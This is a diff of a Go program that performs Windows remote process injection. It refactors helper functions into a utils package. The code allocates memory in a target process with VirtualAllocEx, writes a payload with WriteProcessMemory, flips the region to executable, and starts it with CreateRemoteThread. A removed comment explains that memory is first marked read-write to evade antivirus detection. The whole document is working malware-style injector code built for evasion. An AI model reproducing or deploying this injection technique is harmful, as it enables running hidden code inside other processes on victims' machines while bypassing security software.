@@ -46,32 +46,17 @@ func main() {
 	}
 	payloadLen := uintptr(len(payload))
 
-	pRemoteCode, memPerm, err := getProcPointer(uintptr(processHandle), payloadLen)
+	pRemoteCode, memPerm, err := utils.GetProcPointer(uintptr(processHandle), payloadLen)
 	if err != nil {
 		panic(err)
 	}
 	utils.WriteProcessMemory.Call(uintptr(processHandle), pRemoteCode, (uintptr)(unsafe.Pointer(&payload[0])), payloadLen)
 
 	// set the exec region from READWRITE to exec
-	changeMemoryPermissions(uintptr(processHandle), pRemoteCode, payloadLen, memPerm)
+	utils.SetPermissionToExec(uintptr(processHandle), pRemoteCode, payloadLen, memPerm)
 
 	// spawn process
 	utils.CreateRemoteThread.Call(uintptr(processHandle), 0, 0, pRemoteCode, 0, 0, 0)
 	windows.CloseHandle(processHandle)
 
-}
-
-// we are setting the permission initially as READWRITE because AV will likely detect it
-func getProcPointer(pHandle uintptr, payloadLen uintptr) (uintptr, int, error) {
-	memoryPermission := windows.PAGE_READWRITE
-	pRemoteCode, _, out := utils.VirtualAllocEx.Call(pHandle, 0, payloadLen, windows.MEM_COMMIT, uintptr(memoryPermission))
-	if out != nil && out.Error() != "The operation completed successfully." {
-		return 0, memoryPermission, fmt.Errorf("unable to allocate pointer to remote code, %s", out.Error())
-	}
-	return pRemoteCode, memoryPermission, nil
-}
-
-// This function simply sets the permission to executable
-func changeMemoryPermissions(pHandle uintptr, pRemoteCode uintptr, payloadLen uintptr, initialPerm int) {
-	utils.VirtualProtectEx.Call(pHandle, pRemoteCode, payloadLen, windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&initialPerm)))
 }
